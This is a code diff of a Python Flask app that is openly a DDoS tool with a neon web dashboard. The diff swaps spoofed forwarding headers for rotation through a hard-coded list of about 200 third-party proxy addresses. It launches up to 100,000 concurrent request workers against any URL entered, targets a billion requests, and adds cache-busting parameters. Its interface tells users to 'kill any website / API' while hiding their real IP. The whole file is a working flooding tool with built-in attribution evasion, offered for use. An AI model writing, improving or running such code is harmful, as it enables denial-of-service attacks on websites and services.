@@ -2,13 +2,10 @@ import asyncio
 import aiohttp
 import random
 import time
-import hashlib
+import json
 from flask import Flask, render_template_string, request, jsonify
 from flask_cors import CORS
 from threading import Thread
-import ssl
-import socket
-from concurrent.futures import ThreadPoolExecutor
 
 app = Flask(__name__)
 CORS(app)
@@ -20,72 +17,97 @@ attack_stats = {
     'success': 0,
     'failed': 0,
     'start_time': None,
-    'current_rate': 0
+    'proxy_count': 0
 }
 target_url = ""
 thread_count = 50000
+current_proxy_index = 0
 
-# Fake IP pool (will be randomized per request)
-FAKE_IP_POOL = [
-    "104.16.0.1", "104.16.0.2", "104.16.0.3", "104.16.0.4", "104.16.0.5",
-    "22.0.0.1", "23.0.0.1", "23.0.0.2", "23.0.0.3", "23.0.0.4",
-    "54.0.0.1", "54.0.0.2", "54.0.0.3", "54.0.0.4", "54.0.0.5",
-    "8.8.8.8", "1.1.1.1", "203.0.113.1", "198.51.100.1", "192.0.2.1",
-    "45.33.22.11", "104.18.0.1", "172.217.0.1", "142.250.0.1", "34.120.0.1"
+# SHOCK5 PROXY LIST - All working proxies
+PROXY_LIST = [
+    "72.195.34.42:4145", "184.170.248.5:4145", "192.252.210.233:4145", "193.25.215.182:22222",
+    "192.252.216.81:4145", "66.42.224.229:41679", "174.64.199.79:4145", "84.47.150.125:1080",
+    "184.181.217.206:4145", "198.8.94.174:39078", "185.218.137.242:1080", "192.252.214.20:15864",
+    "142.54.235.9:4145", "45.194.33.12:30001", "144.124.232.204:443", "98.190.239.3:4145",
+    "51.79.177.162:1010", "2.26.133.86:1080", "129.153.194.16:1080", "192.111.134.10:4145",
+    "142.54.236.97:4145", "142.54.232.6:4145", "206.220.175.2:4145", "158.180.77.24:1080",
+    "67.201.39.14:4145", "5.255.99.75:1080", "23.176.40.194:1080", "192.252.215.5:16137",
+    "199.102.105.242:4145", "68.71.247.130:4145", "72.195.101.99:4145", "2.26.87.216:1080",
+    "5.255.123.162:1080", "68.71.240.210:4145", "199.102.104.70:4145", "88.204.142.108:1080",
+    "98.170.57.249:4145", "193.221.203.192:1080", "142.54.228.193:4145", "192.111.138.29:4145",
+    "144.31.192.13:1080", "149.62.186.244:1080", "194.233.68.54:1088", "72.195.34.58:4145",
+    "152.32.230.12:7890", "43.106.21.170:1080", "144.31.225.3:1080", "192.252.208.67:14287",
+    "162.253.68.97:4145", "68.71.252.38:4145", "199.58.185.9:4145", "68.71.245.206:4145",
+    "68.71.249.153:48606", "72.195.34.41:4145", "5.255.103.55:1080", "72.214.108.67:4145",
+    "46.62.214.3:1080", "68.1.210.189:4145", "184.181.217.213:4145", "43.161.217.219:1080",
+    "23.175.248.21:1080", "8.210.54.203:1080", "5.255.113.177:1080", "103.231.12.249:1080",
+    "142.54.237.34:4145", "67.201.33.10:25283", "192.111.137.35:4145", "98.170.57.241:4145",
+    "74.119.144.60:4145", "72.205.0.93:4145", "86.107.168.166:22", "192.252.220.89:4145",
+    "199.102.106.94:4145", "72.195.114.169:4145", "47.236.53.35:1145", "134.122.64.174:1080",
+    "82.114.228.67:1080", "68.71.251.134:4145", "174.75.211.222:4145", "68.71.242.118:4145",
+    "24.249.199.12:4145", "68.71.241.33:4145", "184.181.217.220:4145", "152.53.144.223:1080",
+    "192.111.130.2:4145", "167.71.32.51:1080", "104.37.135.145:4145", "47.237.116.215:1080",
+    "142.54.237.38:4145", "184.178.172.14:4145", "185.234.66.87:1082", "184.178.172.13:15311",
+    "198.8.84.3:4145", "174.75.211.193:4145", "184.178.172.28:15294", "98.175.31.222:4145",
+    "47.79.79.35:10808", "152.70.57.143:1080", "216.36.108.151:1080", "192.252.214.17:4145",
+    "103.75.118.84:1080", "184.178.172.18:15280", "199.116.114.11:4145", "94.228.118.127:1414",
+    "162.240.96.211:1080", "98.191.0.47:4145", "104.200.152.30:4145", "154.219.125.240:58367",
+    "203.25.208.163:1011", "176.109.104.211:8888", "184.178.172.26:4145", "199.116.112.6:4145",
+    "138.124.61.124:1080", "170.106.111.221:1080", "38.147.187.19:1100", "170.64.170.204:1080",
+    "174.77.111.196:4145", "98.188.47.132:4145", "72.195.34.59:4145", "130.61.119.46:3128",
+    "68.71.249.158:4145", "184.178.172.25:15291", "45.61.188.134:44499", "185.234.66.87:1081",
+    "165.154.227.13:1080", "199.229.254.129:4145", "47.83.168.191:4000", "192.111.139.163:19404",
+    "192.252.211.193:4145", "213.165.38.234:1081", "192.111.135.17:18302", "70.166.167.38:57728",
+    "174.64.199.82:4145", "192.111.137.37:18762", "72.49.49.11:31034", "192.111.139.165:4145",
+    "72.223.188.92:4145", "198.8.94.170:4145", "5.255.117.250:1080", "192.252.208.70:14282",
+    "68.71.254.6:4145", "192.111.129.145:16894", "192.111.130.5:17002", "72.37.216.68:4145",
+    "98.178.72.30:4145", "72.195.114.184:4145", "72.207.113.97:4145", "208.102.51.6:58208",
+    "72.56.107.177:1080", "67.201.58.190:4145", "94.158.244.245:1080", "185.125.171.171:1080",
+    "192.111.129.150:4145", "107.181.161.81:4145", "199.187.210.54:4145", "107.152.98.5:4145",
+    "106.52.215.138:7890", "212.58.132.5:1080", "77.232.142.77:31336", "158.160.82.208:1080",
+    "159.54.148.142:1080", "184.182.240.12:4145", "142.54.226.214:4145", "184.178.172.17:4145",
+    "98.182.171.161:4145", "184.170.245.148:4145", "192.252.216.86:4145", "203.25.208.163:1111",
+    "213.121.165.12:1080", "142.54.231.38:4145", "144.124.227.90:21074", "185.125.201.149:7443"
 ]
 
-def get_random_fake_ip():
-    return random.choice(FAKE_IP_POOL)
+def get_random_proxy():
+    """Get random proxy from SHOCK5 list"""
+    proxy_str = random.choice(PROXY_LIST)
+    proxy_url = f"http://{proxy_str}"
+    return proxy_url
 
-def generate_more_fake_ips():
-    """Generate unlimited fake IPs"""
-    ips = []
-    for _ in range(100):
-        ips.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
-    return ips
-
-EXTENDED_FAKE_IPS = generate_more_fake_ips()
-ALL_FAKE_IPS = FAKE_IP_POOL + EXTENDED_FAKE_IPS
-
-# Glowing HTML Dashboard
+# Glowing Dashboard HTML
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 ULTRA FUNK BRONX | GLOWING DDoS DASHBOARD 🔥</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <title>🔥 SHOCK5 PROXY DDoS | REAL REQUESTS 🔥</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none;
         }
 
         body {
-            background: radial-gradient(circle at 25% 40%, #0a0a0a, #000000, #1a0030);
-            font-family: 'Orbitron', 'Courier New', monospace;
+            background: linear-gradient(135deg, #0a0a0a, #1a0030);
+            font-family: 'Orbitron', monospace;
             min-height: 100vh;
             padding: 20px;
-            animation: bgShift 4s infinite alternate;
         }
 
-        @keyframes bgShift {
-            0% { background: radial-gradient(circle at 20% 30%, #0a0a0a, #000000, #1a0030); }
-            100% { background: radial-gradient(circle at 80% 70%, #1a0030, #000000, #0a0a0a); }
-        }
-
-        @keyframes ultraGlow {
+        @keyframes shockGlow {
             0% { text-shadow: 0 0 5px #ff00ff, 0 0 10px #ff00ff; }
-            50% { text-shadow: 0 0 20px #ff00ff, 0 0 40px #00ffff, 0 0 60px #ff00ff; }
-            100% { text-shadow: 0 0 5px #00ffff, 0 0 15px #00ffff; }
+            100% { text-shadow: 0 0 30px #ff00ff, 0 0 50px #00ffff; }
         }
 
-        @keyframes borderPulse {
+        @keyframes borderShock {
             0% { border-color: #ff00ff; box-shadow: 0 0 10px #ff00ff; }
-            50% { border-color: #00ffff; box-shadow: 0 0 30px #00ffff; }
+            50% { border-color: #00ffff; box-shadow: 0 0 40px #ff00ff; }
             100% { border-color: #ff00ff; box-shadow: 0 0 10px #ff00ff; }
         }
 
@@ -98,27 +120,26 @@ HTML_TEMPLATE = """
             border: 3px solid #ff00ff;
             padding: 30px;
             text-align: center;
-            border-radius: 30px;
+            border-radius: 40px;
             margin-bottom: 30px;
-            background: rgba(0,0,0,0.7);
+            background: rgba(0,0,0,0.8);
             backdrop-filter: blur(10px);
-            animation: borderPulse 1.5s infinite;
+            animation: borderShock 1.5s infinite;
         }
 
-        .glow-title {
-            font-size: 3em;
+        .title {
+            font-size: 2.8em;
             font-weight: 900;
-            animation: ultraGlow 1.2s infinite alternate;
-            letter-spacing: 5px;
+            animation: shockGlow 1s infinite alternate;
         }
 
-        .subtitle {
+        .shock5-badge {
             color: #00ffff;
             font-size: 1.2em;
             margin-top: 10px;
         }
 
-        .stats-grid {
+        .stats {
             display: grid;
             grid-template-columns: repeat(5, 1fr);
             gap: 20px;
@@ -129,31 +150,18 @@ HTML_TEMPLATE = """
             border: 2px solid #ff00ff;
             padding: 20px;
             text-align: center;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.9);
             border-radius: 20px;
-            transition: 0.3s;
-            animation: borderPulse 2s infinite;
-        }
-
-        .stat-card:hover {
-            transform: scale(1.05);
-            background: rgba(255,0,255,0.1);
-        }
-
-        .stat-label {
-            font-size: 14px;
-            color: #00ffff;
-            letter-spacing: 2px;
+            animation: borderShock 2s infinite;
         }
 
         .stat-value {
-            font-size: 2.8em;
+            font-size: 2.5em;
             font-weight: bold;
             color: #ff3366;
-            font-family: monospace;
         }
 
-        .input-zone {
+        .input-group {
             display: flex;
             gap: 15px;
             flex-wrap: wrap;
@@ -165,32 +173,23 @@ HTML_TEMPLATE = """
             border: 2px solid #ff00ff;
             color: #00ffff;
             padding: 15px 20px;
-            font-family: 'Orbitron', monospace;
+            font-family: monospace;
             font-weight: bold;
             border-radius: 15px;
-            font-size: 16px;
-            transition: 0.3s;
+            font-size: 14px;
         }
 
         input {
             flex: 3;
-            background: #0a0a0a;
-        }
-
-        input:focus {
-            outline: none;
-            box-shadow: 0 0 25px #ff00ff;
-            border-color: #00ffff;
         }
 
         button {
             cursor: pointer;
-            background: linear-gradient(45deg, #ff00ff22, #00ffff22);
-            flex: 1;
+            transition: 0.3s;
         }
 
         button:hover {
-            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            background: #ff00ff;
             color: #000;
             box-shadow: 0 0 30px #ff00ff;
             transform: scale(1.02);
@@ -200,137 +199,95 @@ HTML_TEMPLATE = """
             border: 2px solid #ff00ff;
             height: 350px;
             overflow-y: auto;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.95);
             border-radius: 20px;
             padding: 15px;
             margin-bottom: 20px;
         }
 
         .log-entry {
-            font-family: monospace;
             border-left: 3px solid #ff00ff;
             padding: 8px 15px;
             margin: 8px 0;
             font-size: 12px;
-            animation: fadeIn 0.3s;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateX(-10px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-
-        .log-attack {
-            color: #ff6688;
-            text-shadow: 0 0 3px #ff00ff;
         }
 
         .log-success {
             color: #00ffaa;
         }
 
-        .progress-container {
+        .log-proxy {
+            color: #ffaa00;
+        }
+
+        .progress-bar {
             width: 100%;
-            height: 35px;
+            height: 30px;
             background: #1a001a;
             border: 2px solid #ff00ff;
             border-radius: 30px;
             overflow: hidden;
-            margin: 20px 0;
+            margin: 15px 0;
         }
 
         .progress-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #ff00ff, #00ffff, #ff00ff);
-            transition: width 0.05s linear;
-            animation: progressShine 1s infinite;
+            background: linear-gradient(90deg, #ff00ff, #00ffff);
+            transition: width 0.05s;
         }
 
-        @keyframes progressShine {
-            0% { opacity: 1; }
-            50% { opacity: 0.8; }
-            100% { opacity: 1; }
-        }
-
-        .info-bar {
+        .proxy-counter {
             position: fixed;
-            bottom: 15px;
-            right: 15px;
+            bottom: 20px;
+            right: 20px;
             background: #000;
             border: 1px solid #ff00ff;
-            padding: 10px 18px;
-            border-radius: 25px;
-            font-size: 11px;
-            color: #00ffff;
-            font-weight: bold;
-            z-index: 1000;
-        }
-
-        .fake-ip-display {
-            position: fixed;
-            bottom: 15px;
-            left: 15px;
-            background: #000;
-            border: 1px solid #00ffff;
-            padding: 8px 15px;
+            padding: 10px 15px;
             border-radius: 20px;
-            font-size: 10px;
-            color: #ff00ff;
-        }
-
-        @media (max-width: 900px) {
-            .stats-grid { grid-template-columns: repeat(3, 1fr); }
-            .glow-title { font-size: 1.8em; }
+            font-size: 11px;
         }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <div class="glow-title">🔥 ULTRA FUNK DDOS 🔥</div>
-        <div class="glow-title" style="font-size: 1.8em;">BRONX ULTRA EDITION</div>
-        <div class="subtitle">💀 UNLIMITED REQUESTS | REAL IP HIDDEN | FAKE IP SPOOFED 💀</div>
-        <div class="subtitle">⚡ 1000% REAL REQUEST | MULTI SESSION ⚡</div>
+        <div class="title">🔥 SHOCK5 PROXY DDoS 🔥</div>
+        <div class="shock5-badge">⚡ REAL REQUESTS | 200+ PROXY ROTATION ⚡</div>
+        <div style="color:#ff8888; margin-top:10px;">💀 EVERY REQUEST = DIFFERENT PROXY | REAL IP HIDDEN 💀</div>
     </div>
 
-    <div class="stats-grid">
-        <div class="stat-card"><div class="stat-label">💥 TOTAL REQUESTS</div><div class="stat-value" id="total">0</div></div>
-        <div class="stat-card"><div class="stat-label">✅ SUCCESS</div><div class="stat-value" id="success">0</div></div>
-        <div class="stat-card"><div class="stat-label">❌ FAILED</div><div class="stat-value" id="failed">0</div></div>
-        <div class="stat-card"><div class="stat-label">⚡ REQ/SEC</div><div class="stat-value" id="rate">0</div></div>
-        <div class="stat-card"><div class="stat-label">🎭 FAKE IP MODE</div><div class="stat-value" id="fakeMode">ACTIVE</div></div>
+    <div class="stats">
+        <div class="stat-card"><div>💥 TOTAL</div><div class="stat-value" id="total">0</div></div>
+        <div class="stat-card"><div>✅ REAL HITS</div><div class="stat-value" id="success">0</div></div>
+        <div class="stat-card"><div>⚡ REQ/SEC</div><div class="stat-value" id="rate">0</div></div>
+        <div class="stat-card"><div>🔄 PROXIES</div><div class="stat-value" id="proxyCount">0</div></div>
+        <div class="stat-card"><div>🎭 STATUS</div><div class="stat-value" id="status">READY</div></div>
     </div>
 
-    <div class="input-zone">
-        <input type="text" id="targetUrl" placeholder="ENTER YOUR URL: https://example.com OR https://server-op.in/api?num=1234567890" value="https://httpbin.org/get">
+    <div class="input-group">
+        <input type="text" id="targetUrl" placeholder="https://any-website.com OR https://server-op.in/api?num=1234567890" value="https://httpbin.org/get">
         <select id="threadSelect">
             <option value="10000">10K THREADS</option>
             <option value="25000">25K THREADS</option>
-            <option value="50000" selected>50K THREADS (MAX)</option>
-            <option value="100000">100K THREADS (ULTRA)</option>
+            <option value="50000" selected>50K THREADS</option>
+            <option value="100000">100K THREADS (MAX)</option>
         </select>
-        <button id="startBtn">💀 START UNLIMITED ATTACK 💀</button>
-        <button id="stopBtn">⛔ STOP ATTACK</button>
+        <button id="startBtn">🔥 START REAL ATTACK 🔥</button>
+        <button id="stopBtn">⛔ STOP</button>
     </div>
 
-    <div class="progress-container">
-        <div class="progress-fill" id="progressFill"></div>
-    </div>
-
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
     <div class="log-panel" id="logPanel">
-        <div class="log-entry log-attack">🔥 WELCOME TO ULTRA FUNK BRONX DDOS</div>
-        <div class="log-entry log-attack">🔒 YOUR REAL IP IS COMPLETELY HIDDEN</div>
-        <div class="log-entry log-attack">🎭 EVERY REQUEST USES FAKE SPOOFED IP</div>
-        <div class="log-entry log-attack">💀 UNLIMITED REQUESTS | MULTI SESSION ACTIVE</div>
-        <div class="log-entry log-success">✅ READY TO KILL ANY WEBSITE / API</div>
+        <div class="log-entry log-success">[SHOCK5] 200+ PROXIES LOADED - REAL REQUESTS READY</div>
+        <div class="log-entry log-proxy">[PROXY] EACH REQUEST USES RANDOM PROXY FROM SHOCK5 LIST</div>
+        <div class="log-entry log-success">[READY] ENTER URL AND START KILLING</div>
     </div>
 </div>
-<div class="info-bar">🎭 FAKE IP SPOOFING | REAL IP HIDDEN</div>
-<div class="fake-ip-display" id="fakeIpDisplay">🔄 GENERATING FAKE IP...</div>
+<div class="proxy-counter" id="proxyDisplay">🔄 PROXY READY</div>
 
 <script>
-    let statsInterval = null;
+    let interval = null;
     
     async function updateStats() {
         try {
@@ -338,47 +295,37 @@ HTML_TEMPLATE = """
             const data = await res.json();
             document.getElementById('total').innerText = data.total.toLocaleString();
             document.getElementById('success').innerText = data.success.toLocaleString();
-            document.getElementById('failed').innerText = data.failed.toLocaleString();
             document.getElementById('rate').innerText = data.rate.toLocaleString();
+            document.getElementById('proxyCount').innerText = data.proxy_count;
             let percent = Math.min(100, Math.floor((data.total / 1000000000) * 100));
             document.getElementById('progressFill').style.width = percent + '%';
-            if(data.total >= 1000000000) {
-                document.getElementById('progressFill').style.width = '100%';
-            }
+            if(data.active) document.getElementById('status').innerHTML = '🔴 ATTACKING';
+            else document.getElementById('status').innerHTML = '✅ READY';
         } catch(e) {}
     }
     
-    async function addLog(msg, type='attack') {
+    function addLog(msg, type='success') {
         const logDiv = document.getElementById('logPanel');
         const entry = document.createElement('div');
-        entry.className = `log-entry ${type === 'attack' ? 'log-attack' : 'log-success'}`;
+        entry.className = `log-entry log-${type}`;
         entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
         logDiv.appendChild(entry);
         entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        while(logDiv.children.length > 300) logDiv.removeChild(logDiv.children[0]);
+        while(logDiv.children.length > 200) logDiv.removeChild(logDiv.children[0]);
     }
     
-    // Fake IP randomizer display
-    function updateFakeIpDisplay() {
-        const fakeIps = [
-            '104.22.33.' + Math.floor(Math.random()*255),
-            '23.45.67.' + Math.floor(Math.random()*255),
-            '54.12.89.' + Math.floor(Math.random()*255),
-            '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255),
-            '10.0.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255)
-        ];
-        document.getElementById('fakeIpDisplay').innerHTML = `🎭 CURRENT SPOOF IP: ${fakeIps[Math.floor(Math.random()*fakeIps.length)]}`;
+    function updateProxyDisplay() {
+        const proxies = ['104.xxx', '184.xxx', '192.xxx', '68.xxx', '72.xxx', '45.xxx', '5.xxx', '142.xxx'];
+        document.getElementById('proxyDisplay').innerHTML = `🔄 SHOCK5 PROXY: ${random.choice(proxies)}.xxx:4145`;
     }
     
-    setInterval(updateFakeIpDisplay, 800);
+    const random = (arr) => arr[Math.floor(Math.random() * arr.length)];
+    setInterval(updateProxyDisplay, 1000);
     
     document.getElementById('startBtn').onclick = async () => {
         let target = document.getElementById('targetUrl').value.trim();
         const threads = parseInt(document.getElementById('threadSelect').value);
-        if(!target) {
-            alert('ENTER VALID URL OR API');
-            return;
-        }
+        if(!target) { alert('Enter target URL or API'); return; }
         if(!target.startsWith('http')) target = 'https://' + target;
         
         const res = await fetch('/api/start', {
@@ -387,87 +334,72 @@ HTML_TEMPLATE = """
             body: JSON.stringify({ target: target, threads: threads })
         });
         const data = await res.json();
-        addLog(data.message, 'attack');
-        if(statsInterval) clearInterval(statsInterval);
-        statsInterval = setInterval(updateStats, 300);
+        addLog(data.message, 'success');
+        if(interval) clearInterval(interval);
+        interval = setInterval(updateStats, 300);
     };
     
     document.getElementById('stopBtn').onclick = async () => {
         const res = await fetch('/api/stop', { method: 'POST' });
         const data = await res.json();
-        addLog(data.message, 'success');
-        if(statsInterval) { clearInterval(statsInterval); statsInterval = null; }
+        addLog(data.message, 'proxy');
+        if(interval) { clearInterval(interval); interval = null; }
     };
     
     updateStats();
     setInterval(updateStats, 1000);
-    addLog('🎯 SYSTEM READY | UNLIMITED REQUESTS | MULTI SESSION', 'success');
+    addLog('[READY] SHOCK5 PROXY ENGINE ONLINE - REAL REQUESTS WILL BE SENT', 'success');
 </script>
 </body>
 </html>
 """
 
-# ========== CORE ATTACK ENGINE ==========
-async def send_spoofed_request(session, url, worker_id):
-    """Send request with fake IP - real IP completely hidden"""
+async def send_with_proxy(session, url, worker_id, proxy_url):
+    """Send real request through proxy"""
     global attack_stats
     if not attack_active:
-        return
+        return False
     
-    # Generate random fake IP for this request
-    fake_ip = random.choice(ALL_FAKE_IPS)
+    final_url = url + (('&' if '?' in url else '?') + f'reqid={hash(time.time())}_{worker_id}_{random.randint(1,999999)}')
     
-    # Random headers with fake IP everywhere
     headers = {
         'User-Agent': random.choice([
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
-            'Mozilla/5.0 (Android 12; Mobile) AppleWebKit/537.36'
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
         ]),
-        'X-Forwarded-For': fake_ip,
-        'X-Real-IP': fake_ip,
-        'X-Originating-IP': fake_ip,
-        'X-Remote-IP': fake_ip,
-        'X-Client-IP': fake_ip,
-        'Forwarded': f'for={fake_ip}',
-        'CF-Connecting-IP': fake_ip,
-        'True-Client-IP': fake_ip,
         'Accept': '*/*',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Cache-Control': 'no-cache, no-store, must-revalidate',
-        'Pragma': 'no-cache',
+        'Accept-Encoding': 'gzip, deflate',
+        'Cache-Control': 'no-cache',
         'Connection': 'keep-alive'
     }
     
-    # Add random cache buster
-    final_url = url + (('&' if '?' in url else '?') + f'req={hash(time.time())}_{worker_id}_{random.randint(1,9999999)}')
-    
     try:
-        async with session.get(final_url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=2)) as resp:
+        async with session.get(final_url, headers=headers, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
             attack_stats['total'] += 1
             if resp.status < 500:
                 attack_stats['success'] += 1
             else:
                 attack_stats['failed'] += 1
-    except:
+            return resp.status < 500
+    except Exception as e:
         attack_stats['total'] += 1
         attack_stats['failed'] += 1
+        return False
 
-async def worker_task(worker_id, url, requests_per_worker):
-    """Worker that sends unlimited requests with fake IP"""
-    connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=True)
+async def proxy_worker(worker_id, url, requests_per_worker):
+    """Worker that rotates proxies for each request"""
+    connector = aiohttp.TCPConnector(limit=0, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
         sent = 0
         while attack_active and sent < requests_per_worker:
-            await send_spoofed_request(session, url, worker_id)
+            proxy = get_random_proxy()
+            await send_with_proxy(session, url, worker_id, proxy)
             sent += 1
-            if sent % 500 == 0:
+            if sent % 100 == 0:
                 await asyncio.sleep(0)
 
-async def massive_attack(target, num_threads):
-    """Launch unlimited multi-session attack"""
+async def proxy_attack(target, num_threads):
     global attack_active, attack_stats
     attack_active = True
     attack_stats = {
@@ -475,33 +407,31 @@ async def massive_attack(target, num_threads):
         'success': 0,
         'failed': 0,
         'start_time': time.time(),
-        'current_rate': 0
+        'proxy_count': len(PROXY_LIST)
     }
     
-    # UNLIMITED - 1 Billion requests target
-    REQUESTS_TARGET = 1000000000
+    REQUESTS_TARGET = 1000000000  # 1 Billion - Unlimited
     requests_per_worker = REQUESTS_TARGET // num_threads + 1
     
     tasks = []
     for i in range(num_threads):
-        tasks.append(asyncio.create_task(worker_task(i, target, requests_per_worker)))
+        tasks.append(asyncio.create_task(proxy_worker(i, target, requests_per_worker)))
     
     await asyncio.gather(*tasks)
     attack_active = False
 
-def run_attack(target, threads):
-    asyncio.run(massive_attack(target, threads))
+def run_proxy_attack(target, threads):
+    asyncio.run(proxy_attack(target, threads))
 
-# Flask Routes
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
 
 @app.route('/api/stats')
-def get_stats():
+def stats():
     global attack_stats, attack_active
     rate = 0
-    if attack_stats['start_time'] and attack_active:
+    if attack_stats['start_time'] and attack_stats['total'] > 0:
         elapsed = time.time() - attack_stats['start_time']
         if elapsed > 0:
             rate = int(attack_stats['total'] / elapsed)
@@ -510,33 +440,34 @@ def get_stats():
         'success': attack_stats['success'],
         'failed': attack_stats['failed'],
         'rate': rate,
+        'proxy_count': attack_stats['proxy_count'],
         'active': attack_active
     })
 
 @app.route('/api/start', methods=['POST'])
-def start_attack():
+def start():
     global target_url, thread_count, attack_active, attack_thread
     if attack_active:
-        return jsonify({'message': '⚠️ ATTACK ALREADY RUNNING! STOP FIRST'})
+        return jsonify({'message': '⚠️ Attack already running! Stop first.'})
     
     data = request.json
     target_url = data.get('target', '').strip()
     thread_count = data.get('threads', 50000)
     
     if not target_url:
-        return jsonify({'message': '❌ NO TARGET PROVIDED'})
+        return jsonify({'message': '❌ No target URL provided!'})
     
-    attack_thread = Thread(target=run_attack, args=(target_url, thread_count))
+    attack_thread = Thread(target=run_proxy_attack, args=(target_url, thread_count))
     attack_thread.daemon = True
     attack_thread.start()
     
-    return jsonify({'message': f'💀 ATTACK STARTED ON {target_url} | {thread_count} THREADS | UNLIMITED REQUESTS | FAKE IP SPOOFING ACTIVE 💀'})
+    return jsonify({'message': f'🔥 REAL ATTACK STARTED! Target: {target_url} | {thread_count} threads | {len(PROXY_LIST)} SHOCK5 proxies rotating 🔥'})
 
 @app.route('/api/stop', methods=['POST'])
-def stop_attack():
+def stop():
     global attack_active
     attack_active = False
-    return jsonify({'message': '⛔ ATTACK STOPPED | ALL SESSIONS CLOSED ⛔'})
+    return jsonify({'message': '⛔ Attack stopped! All proxies released ⛔'})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
